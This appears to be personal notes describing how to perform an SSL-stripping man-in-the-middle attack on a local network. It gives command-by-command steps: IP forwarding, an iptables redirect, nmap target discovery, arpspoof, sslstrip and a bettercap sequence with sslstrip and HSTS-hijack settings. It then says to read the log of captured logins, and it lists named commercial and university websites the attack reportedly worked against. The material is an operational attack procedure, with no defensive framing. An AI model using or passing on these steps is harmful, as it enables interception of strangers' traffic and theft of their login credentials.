#### SSLStripping Process
1.  Enable ip_fowarding so the pc can route traffic
ip_forwarding -- sudo bash -c 'echo 1 > /proc/sys/net/ipv4/ip_forward'
2. ip rerouting -- iptables...
3.  gateway ip address -- route -n
4. Scan target network to find a specific computer
5. nmap -sP 192.168.1.0/24
6. Review scan results and choose a target
7. Arpspoof to redirect the computers http traffic to our computer
7. Whilst that runs in the background start sslstrip
8. Login via the targets computer into some site
9. Review sslstrip log file  -- cat sslstrip.log
iptables affects the host where the command is executed. It modifies how that machine handles incoming and outgoing packets.

#### Quick overview of networking tools
iptables -t nat -A PREROUTING -p tcp --destination-port n - j REDIRECT --to-port N
iptables — modifies the NAT (Network Address Translation) table to redirect incoming TCP traffic on port port  n (in our case 80) over to to port N. 
-A PREROUTING — appends a rule to the prerouting chain, which processes packets before they are routed
-p tcp — specifies that the rule applies to tcp packets
-j redirect — specifies that packets should be redirected

#### arpspoof
arpspoof works at a low level, manipulating the ARP table entries of devices on the local network to redirect traffic without altering firewall rules or packet processing at higher layers.

manipulates the ARP tables of devices on the local network to make them believe that your machine's MAC address corresponds to another device's IP address (like the router or another host)

#### net.probe
net.probe enables network probing within bettercap, allowing the tool to discover devices on the network by sending arp requests and listening for responses

#### net.sniff
net.sniff activates packet sniffing, so bettercap will start capturing and analyzing the traffic flowing through the network

#### Bettercap Steps:
0. sudo bettercap -iface eth0
1. caplets.show (optional)
2. set http.proxy.sslstrip true
3. hstshijack/hstshijack
4. net.probe on
5. net.sniff on
6. arp.spoof on
* Note: ```help``` is always available if you don't know what to do.

#### Working Sites (in process)
**Sites that worked:**
alibaba
foxnews
ign.com
speedtest.com

**Institutional Sites:**
carleton.edu
mit.edu
washington.edu
and most likely more…
